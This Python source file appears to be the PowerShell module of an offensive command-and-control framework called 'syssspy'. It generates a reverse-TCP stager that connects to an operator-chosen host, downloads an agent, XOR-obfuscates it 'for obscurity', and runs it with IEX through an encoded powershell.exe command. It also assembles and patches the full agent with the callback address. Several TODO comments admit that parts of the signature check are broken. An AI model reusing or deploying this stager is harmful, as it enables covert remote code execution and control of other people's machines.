
from helpers.log import *
import helpers.strings as helps
import helpers.encryption as encryption
import helpers.tls
from ..platform import Platform
from helpers.modulebase import ModuleBase
import os.path
import base64


DEBUG_MODULE = "PlatformPowershell"
MAX_AGENT_LEN = 102400 # TODO: choose shorter value, when done writing agent => faster staging
SIGNATURE_ALGO = "SHA512"
SIGNATURE_LEN = 512
STATIC_SIGN_STRING = "syssspy"


class PlatformPowershell(Platform, ModuleBase):
    """
    platform code to provide a stager and an agent generator for powershell
    """

    def __init__(self):
        """
        powershell plattform code
        """

        self.options = {
            'STAGED' : {
                'Description'   :   'Is the communication setup staged or not?',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            },
            'STAGEENCODING' : {
                'Description'   :   'Should we send the staged agent in an encoded form (obscurity, not for security!)',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            },
            'STAGEAUTHENTICATION' : {
                'Description'   :   'Should the stager verify the agent code before executing (RSA signature verification with certificate pinning)',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            },
            'STAGECERTIFICATEFILE' : {
                'Description'   :   'File path of a PEM with both RSA key and certificate to sign and verify staged agent with (you can generate a selfsigned cert by using the script gencert.sh initially)',
                'Required'      :   False,
                'Value'         :   "./data/syssspy.pem"
            }
        }
        self.platformpath = os.path.abspath(os.path.dirname(__file__))
        self.privatekey = None
        self.fingerprint = None
        self.certificate = None
        self.publickeyxml = None

    def setoption(self, name, value):
        """
        Sets option to value if possible.
        If STAGECERTIFICATEFILE has been changed, check consistency of its value.
        """

        if name.upper() == "STAGECERTIFICATEFILE":
            if not(self._validate_certificatefile("STAGECERTIFICATEFILE",value)):
                return True # value found, but not set
            else:
                # reset all key/cert data, it might change now
                self.privatekey = None
                self.fingerprint = None
                self.certificate = None
                self.publickeyxml = None

        return ModuleBase.setoption(self, name, value)

    def _validate_certificatefile(self, name, filename):
        """
        validate the certificate file path for existance and if it can be loaded as certificate
        """

        if not os.path.isfile(filename):
            print_error("{} at {} does not exist".format(name, os.path.realpath(filename)))
            return False
        elif not self._tryload_certificatefile(filename):
            print_error("Could not load {}".format(name))
            return False
        else:
            return True

    def _tryload_certificatefile(self, filename):
        """
        try to load the certificate file
        """

        if helpers.tls.load_certificate(filename) and helpers.tls.load_privatekey(filename):
            return True
        else:
            return False

    def _sign_data(self, data):
        """
        sign the data with the already loaded private key
        """
        
        if not self.privatekey:
            return None
        return helpers.tls.create_signature(self.privatekey, data)
    
    def _getfingerprint(self):
        """
        returns the fingerprint = sha512(rsasign(PrivateKey, STATIC_SIGN_STRING))
        to verify the server certificat in the stager and to also do stage encoding
        """
        
        sign = self._sign_data(STATIC_SIGN_STRING)
        print_debug(DEBUG_MODULE, "signature length = {}".format(len(sign)))
        return helpers.tls.sha512(sign)

    def _getrsapublickeyxml(self):
        if not self.certificate:
            return None
        else:
            publicnumbers = self.certificate.get_pubkey().to_cryptography_key().public_numbers()
            modulus = base64.b64encode(helpers.tls.int2bytes(publicnumbers.n)).decode()
            exponent = base64.b64encode(helpers.tls.int2bytes(publicnumbers.e)).decode()
            xml = '<RSAKeyValue><Modulus>{}</Modulus><Exponent>{}</Exponent></RSAKeyValue>'.format(modulus, exponent)
            return xml

    def _initkeycertificate(self):
        """
        load the private key and certificate from STAGECERTIFICATEFILE, calculate fingerprint and
        publickeyxml with them
        """

        if self.privatekey and self.fingerprint and self.certificate and self.publickeyxml:
            return # all set up

        self.privatekey = helpers.tls.load_privatekey(self.options['STAGECERTIFICATEFILE']['Value'])
        if not self.privatekey:
            print_error("Failed to load privatekey, please check STAGECERTIFICATEFILE")
            return
        self.certificate = helpers.tls.load_certificate(self.options['STAGECERTIFICATEFILE']['Value'])
        if not self.certificate:
            print_error("Failed to load certificate, please check STAGECERTIFICATEFILE")
            return
        self.fingerprint = self._getfingerprint()
        self.publickeyxml = self._getrsapublickeyxml()

    def validate_options(self):
        """
        validate the options for the platform
        Especially check validity of our STAGECERTIFICATEFILE if necessary
        """

        valid = ModuleBase.validate_options(self)

        # do we need STAGECERTIFICATEFILE and is it valid?
        if self.options['STAGED']['Value'] == "TRUE" and self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
            if not self.options['STAGECERTIFICATEFILE']['Value'] or self.options['STAGECERTIFICATEFILE']['Value'] == "":
                print_error("STAGECERTIFICATEFILE must be set when using STAGEENCODING and/or STAGEAUTHENTICATION")
                valid = False
            elif not self._validate_certificatefile("STAGECERTIFICATEFILE",self.options['STAGECERTIFICATEFILE']['Value']):
                valid = False

        return valid

    def isstaged(self):
        """
        powershell platform can be staged by setting the option
        """

        return (self.options['STAGED']['Value'] == "TRUE")

    def getstager(self, handler):
        """
        Generate the stager string
        """

        if not self.isstaged():
            print_error("Platform is not staged. Consider changing option STAGED or generating agent directly.")
            return None
        if not handler.transport:
            print_error("Transport not set")
            return None

        # generate powershell + reversetcp stager
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            ip = handler.transport.options['CONNECTHOST']['Value'] or handler.transport.options['LHOST']['Value']
            if ip == "0.0.0.0":
                print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                return None
            port = handler.transport.options['CONNECTPORT']['Value'] or handler.transport.options['LPORT']['Value']
            print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))
            # TODO: Consider using helps.randomize_capitalization(...)
            stager = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip,port)
            stager += '$a=New-Object char[]({});'.format(MAX_AGENT_LEN)
            stager += '$r=New-Object IO.StreamReader($c.GetStream());'
            stager += '$b=$r.Read($a,0,{});'.format(MAX_AGENT_LEN)

            # include fingerprint only if needed for STAGEENCODING and/or STAGEAUTHENTICATION
            if self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
                self._initkeycertificate()
                stager += '$fp="{}";'.format(self.fingerprint)

            # for stage encoding, include decoding algorithm here
            if self.options['STAGEENCODING']['Value'] == "TRUE":
                stager += '$i=0;$a=$a|%{$_-bXor$fp[$i++%$fp.Length]};'

            # for stage authentication, include fingerprint and verification code here
            if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
                self._initkeycertificate()

                # split data in publickey, signature, agentcode:
                parsepos=0 # next position to parse the array to string
                stager += '$pk=New-Object String($a,{},{});'.format(parsepos, len(self.publickeyxml))
                parsepos += len(self.publickeyxml)
                stager += '$sig=New-Object String($a,{},{});'.format(parsepos,SIGNATURE_LEN)
                parsepos += SIGNATURE_LEN
                stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos,parsepos)
                # TODO: this does not work, somehow $s is rubbisch!!!!                

                # verify the public key and signature
                stager += '$x=New-Object Security.Cryptography.RSACryptoServiceProvider(4096);'
                stager += '$x.FromXmlString($pk);'
                stager += 'if(-Not $x.VerifyData("{}".ToCharArray(),"{}",$fp.ToCharArray())){{Write-Out 1}};'.format(SIGNATURE_ALGO, STATIC_SIGN_STRING) # check fingerprint of server cert # TODO: Exit(1)
                stager += 'if(-Not $x.VerifyData($s.ToCharArray(),"{}",$sig.ToCharArray())){{Write-Out 2}};'.format(SIGNATURE_ALGO) # check signature of agent code # TODO: Exit(1)
            else:
                stager += '$s=New-Object String($a,0,$b);'

            # finally execute the agent
            stager += 'IEX $s;'
            print_debug(DEBUG_MODULE, "stager = {}".format(stager))
            return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ") # TODO: baseCmd

        # combination platform / transport currently not supported 
        else:
            print_error("No stager for platform and transport found.")
            return None

    def getagent(self, handler):
        """
        Generate the full powershell agent string for this setup if possible
        """

        print_debug("DEBUG_MODULE", "platformpath = {}".format(self.platformpath))
        agent = ""

        # add selected transport implementation
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            f = open(self.platformpath + "/transport/reversetcp.ps1", 'r')

        # combination platform / transport currently not supported 
        else:
            print_error("No agent module for platform and transport found.")
            return None
        agent += f.read()
        f.close()

        # add message basics
        f = open(self.platformpath + "/message/message.ps1", 'r')
        agent += f.read()
        f.close()
        
        # add agent base code
        f = open(self.platformpath + "/agent.ps1", 'r')
        agent += f.read()
        f.close()

        # strip comments and empty lines
        agent = helps.strip_powershell_comments(agent)

        # get and replace some values
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            ip = handler.transport.options['CONNECTHOST']['Value'] or handler.transport.options['LHOST']['Value']
            if ip == "0.0.0.0":
                print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                return None
            port = handler.transport.options['CONNECTPORT']['Value'] or handler.transport.options['LPORT']['Value']
            print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))

            agent = agent.replace('SYREPLACE_CONNECTIONMETHOD', "TCP")
            agent = agent.replace('SYREPLACE_CONNECTHOST', str(ip))
            agent = agent.replace('SYREPLACE_CONNECTPORT', str(port))

        # combination platform / transport currently not supported 
        else:
            print_error("No agent module for platform and transport found.")
            return None

        # ok, lets encode the agent
        agent = agent.encode('utf-8')

        # TODO: stage authentication
        if self.isstaged() and self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
            self._initkeycertificate()
            if not self.publickeyxml:
                print_error("Cannot sign agent, since STAGEAUTHENTICATION is active but creating the publickeyxml failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
                return None
            else:
                #print_error("STAGEAUTHENTICATION not implemented yet")
                print_debug(DEBUG_MODULE, "publickey as xml = {}".format(self.publickeyxml))
                agent = self.publickeyxml.encode('utf-8') + self._sign_data(agent) + agent

        # encode agent with fingerprint as encodingkey if active
        if self.isstaged() and self.options['STAGEENCODING']['Value'] == "TRUE":
            self._initkeycertificate()
            if not self.fingerprint:
                print_error("Cannot encode agent, since STAGEENCODING is active but creating the certificate fingerprint failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
                return None
            else:
                agent = encryption.xor_encode(agent, self.fingerprint)

        if len(agent) > MAX_AGENT_LEN and self.isstaged():
            print_error("agent is longer than stager buffer, staging will fail")
        return agent

